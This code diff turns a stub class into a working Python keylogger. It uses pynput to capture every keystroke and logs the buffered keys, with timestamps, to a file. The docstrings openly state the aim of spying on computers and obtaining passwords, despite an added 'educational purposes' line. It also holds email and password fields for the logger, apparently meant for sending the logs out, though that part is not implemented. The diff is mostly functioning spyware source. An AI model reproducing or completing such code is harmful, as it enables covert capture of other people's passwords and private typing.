@@ -1,28 +1,49 @@
+from pynput.keyboard import Key, Listener
+import logging
+import time
 
-class Keylogger:
+class KeyLogger:
     """
-    Keylogger provides the functionality for a keylogger
-    Can be used in applications to SPY on peoples compyters
-    and obtain passwords and screenshots
+    Class used to track keystrokes and spy on computers using screenshots
+    <!This is solely for educational purposes!>
+        
+    KeyLogger used to track keystrokes on keyboards
+    toemail: email being sent to by logger
+    lemail: loggers email account
+    pswd: loggers email password
+    pswd: password
+    stime: time of the current logging round
     """
-    def __init__(self, filename="~/Documents/log.txt", email="default@gmail.com", pswd="drowssap"):
-        self.email = email
+    def __init__(self, log_dir="", email="default@gmail.com", pswd="drowssap"):
+        self.toemail = email
+        self.lemail = "default@gmail.com"
         self.pswd = pswd
         self.mem = []
-        self.fname = filename
+        self.stime = time.time()
+        logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.INFO, format='%(asctime)s: %(message)s')
 
     def __screenshot(self):
+        """
+        Takes screenshot of computer
+        """
         # TODO takes a screenshot of the persons screen
         return None
-
-    def __get_key(self):
-        # TODO gets the key that was pressed and returns the character
-        return None
-
-    def __log_key(self):
-        # TODO logs the key into the memory, and writes to file at maxsize
-        return None
-
+        
+    def __on_press(self, key):
+        """
+        Action taken on keyboard press
+        """
+        self.mem.append(str(key))
+        if self.stime - time.time() >= 10.0 or key == Key.space or key == Key.enter:
+            # log the data, update time and flush buffer
+            logging.info("".join(self.mem))
+            self.mem.clear() 
+            self.stime = time.time()
+            
     def run_keylogger(self):
-        # TODO runs keylogger logic
-        print("running")
+        with Listener(on_press=self.__on_press) as listener:
+            try:
+                listener.join()
+            except Exception:
+                print("Threading error")
+    
